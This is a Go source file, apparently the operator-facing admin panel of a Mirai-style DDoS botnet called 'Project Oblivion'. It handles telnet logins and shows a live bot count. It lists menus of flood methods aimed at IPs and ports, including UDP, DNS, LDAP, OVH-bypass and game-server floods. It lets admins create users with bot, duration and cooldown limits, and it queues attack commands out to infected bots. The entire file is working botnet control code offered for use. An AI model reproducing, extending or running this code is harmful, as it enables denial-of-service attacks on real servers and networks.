package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	//Get Username
    this.conn.Write([]byte(fmt.Sprintf("\033]0;Project Oblivion\007")))
    this.conn.Write([]byte("\x1b[91m[\x1b[91mUsername\x1b[91m]\x1b[91m: \x1b[91m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.Write([]byte(fmt.Sprintf("\033]0;Project Oblivion\007")))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;94m[\x1b[1;94mPassword\x1b[1;94m]\x1b[1;94m: \x1b[1;94m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte(fmt.Sprintf("\033]0;Project Oblivion\007")))
        this.conn.Write([]byte("\x1b[91mInvalid \x1b[91mCredentials\x1b[91m. Connection Logged!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Oblivion  |  [+] Shooters [+] %d  | User: %s \007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
     this.conn.Write([]byte("\033[2J\033[1;1H"))
     this.conn.Write([]byte("\x1b[91m                             Welcome To \x1b[91mOblivion    \r\n"));                             
     this.conn.Write([]byte("\x1b[91m                Type \x1b[91m?  \x1b[91mFor A List Of Available Commands    \r\n"));
     

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[91m[\x1b[91m" + username + "\x1b[91m#\x1b[\033[1;94mOblivion\x1b[\033[1;94m]\x1b[\033[1;94m: \x1b[\033[1;94m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" || cmd == "./LOGOUT" || cmd == "./logout" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))    
            this.conn.Write([]byte("\x1b[91m                                                          \r\n"))
            this.conn.Write([]byte("\x1b[91m                            ▄▄▄▄· ▄▄▌  ▪   \033[1;94m▌ ▐·▪         ▐ ▄ \r\n"));
            this.conn.Write([]byte("\x1b[91m                       ▄█▀▄ ▐█ ▀█▪██•  ██ ▪\033[1;94m█·█▌██  ▄█▀▄ •█▌▐█\r\n"));
            this.conn.Write([]byte("\x1b[91m                      ▐█▌.▐▌▐█▀▀█▄██ ▪ ▐█·▐\033[1;94m█▐█•▐█·▐█▌.▐▌▐█▐▐▌\r\n"));
            this.conn.Write([]byte("\x1b[91m                      ▐█▌.▐▌██▄▪▐█▐█▌ ▄▐█▌ \033[1;94m███ ▐█▌▐█▌.▐▌██▐█▌\r\n"));
            this.conn.Write([]byte("\x1b[91m                       ▀█▄▀▪·▀▀▀▀ .▀▀▀ ▀▀▀.\033[1;94m ▀  ▀▀▀ ▀█▄▀▪▀▀ █▪\r\n"));
            this.conn.Write([]byte("\x1b[91m                                   ? For He\033[1;94mlp\r\n"));
            this.conn.Write([]byte("\x1b[91m                       Welcome to the Proje\033[1;94mct Oblivion Botnet,\r\n"));
            this.conn.Write([]byte("\x1b[91m             Follow @downmy100up on ig befo\033[1;94mre you touch anything else hoe\r\n"));
            this.conn.Write([]byte("\x1b[91m\r\n"));
	       continue
		}	

        if err != nil || cmd == "./HELP" || cmd == "./help" || cmd == "?" {
            
            this.conn.Write([]byte("\x1b[91m  ╔══════════════════════════════════════════════╗\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[91m  ║  \x1b[91m./HOME  \x1b[90m- \x1b[0mShows A List Of home methods      \x1b[91m║\r\n")); 
            this.conn.Write([]byte("\x1b[91m  ║  \x1b[91m./BYPASS  \x1b[90m- \x1b[0mShows A List Of bypass methods  \x1b[91m║\r\n")); 
            this.conn.Write([]byte("\x1b[91m  ║  \x1b[91m./BYPASS2  \x1b[90m- \x1b[0mShows A List Of bypass methods \x1b[91m║\r\n"));                                         
            this.conn.Write([]byte("\x1b[1;94m  ║  \x1b[91m./GAME  \x1b[90m- \x1b[0mShows A List Of game methods      \x1b[1;94m║\r\n"));                                         
            this.conn.Write([]byte("\x1b[1;94m  ║  \x1b[1;94m CLEAR     \x1b[90m- \x1b[0mShows Bots Count               \x1b[1;94m║\r\n"));                
            this.conn.Write([]byte("\x1b[1;94m  ╚══════════════════════════════════════════════╝\x1b[1;94m\r\n"))                               
            continue
        }
        if err != nil || cmd == "./home" || cmd == "./HOME" {

    this.conn.Write([]byte("\x1b[91m ╔═════════════════\033[1;94m══════════════════╗\x1b[0m\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./UDP    [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./PLAIN  [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./STD    [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./STDHEX [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./DNS    [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./ATNT   [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./ICE    [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./HEX    [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ╚═════════════════\033[1;94m══════════════════╝\r\n")) 
    continue

        }
        if err != nil || cmd == "./bypass2" || cmd == "./BYPASS2" {

    this.conn.Write([]byte("\x1b[91m ╔═════════════════\033[1;94m════════════════════╗\x1b[0m\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./oblivion [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./nfo-raw  [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./ovh-udp  [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./ovh-kick [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ╚═════════════════\033[1;94m════════════════════╝\r\n")) 
    continue


        }
        if err != nil || cmd == "./bypass" || cmd == "./BYPASS" {

    this.conn.Write([]byte("\x1b[91m   ╔═════════════════\033[1;94m══════════════════╗ \x1b[0m\r\n"))
    this.conn.Write([]byte("\033[91m   ║ ./rape    [IP] [\033[1;94mTIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m   ║ ./udprape [IP] [\033[1;94mTIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m   ║ ./ack     [IP] [\033[1;94mTIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m   ║ ./null    [IP] [\033[1;94mTIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m   ║ ./LDAP    [IP] [\033[1;94mTIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m   ║ ./100down [IP] [\033[1;94mTIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\x1b[91m ╔═╚═════════════════\033[1;94m══════════════════╝═╗ \r\n"))
    this.conn.Write([]byte("\033[91m ║ ./ovh-fuck   [IP] \033[1;94m[TIME] dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m ║ ./100-gonev2 [IP] \033[1;94m[TIME] dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m ║ ./ovh-pumpv2 [IP] \033[1;94m[TIME] dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m ║ ./ob-killall [IP] \033[1;94m[TIME] dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m ║ ./fivemraipe [IP] \033[1;94m[TIME] dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\x1b[91m ╚╔══════════════════\033[1;94m═══════════════════╗╝ \r\n"))
    this.conn.Write([]byte("\033[91m  ║ ./tcp-kill  [IP] \033[1;94m[TIME]dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m  ║ ./tcp-pappy [IP] \033[1;94m[TIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m  ║ ./tcp-stil  [IP] \033[1;94m[TIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m  ║ ./ovh-nat   [IP] \033[1;94m[TIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m  ║ ./ovh-cp    [IP] \033[1;94m[TIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m  ║ ./ovh-std   [IP] \033[1;94m[TIME]dport=[PORT] ║ \r\n"))
    this.conn.Write([]byte("\033[91m  ╚══════════════════\033[1;94m═══════════════════╝ \r\n"))  
    continue


        }
        if err != nil || cmd == "./game" || cmd == "./GAME" {

    this.conn.Write([]byte("\x1b[91m ╔════════════════════\033[1;94m══════════════════╗\x1b[0m\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./fn-kill   [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./r6-ranked [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./2k-freeze [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./doa       [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./mc        [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./game-hex  [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./game-tcp  [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ║ ./vse-game  [IP] [T\033[1;94mIME] dport=[PORT] ║\r\n"))
    this.conn.Write([]byte("\033[91m ╚════════════════════\033[1;94m══════════════════╝\r\n")) 
    continue 
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDREG" {
            this.conn.Write([]byte("\x1b[91mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[91mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[91mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[91mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[91mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91m%s\033[0m\r\n", "Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[91m- New User Info - \r\n- Username - \x1b[91m" + new_un + "\r\n\033[0m- Password - \x1b[91m" + new_pw + "\r\n\033[0m- Bots - \x1b[91m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[91m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[91m" + cooldown_str + "   \r\n\x1b[91mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[91mUser Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\x1b[91mUsername: \x1b[0m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[91mAre You Sure You Want To Remove \x1b[91m" + rm_un + "\x1b[91m?(y/n): \x1b[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[91mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDADMIN" {
            this.conn.Write([]byte("\x1b[91mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[91mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[91mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[91mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[91mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[91m- New User Info - \r\n- Username - \x1b[91m" + new_un + "\r\n\033[0m- Password - \x1b[91m" + new_pw + "\r\n\033[0m- Bots - \x1b[91m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[91m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[91m" + cooldown_str + "   \r\n\x1b[91mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[91mAdmin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == ".BOTS" || cmd == ".bots" || cmd == "bots" || cmd == "BOTS" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[91m%s \x1b[0m[\x1b[91m%d\x1b[0m]\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[91mTotal \x1b[0m[\x1b[91m%d\x1b[0m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var BotCount int
                    BotCount = clientList.Count()
                    this.conn.Write([]byte(fmt.Sprintf("\033[1;94mAttack Sent! %d \x1b[1;94mBots  \r\n", BotCount)))
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
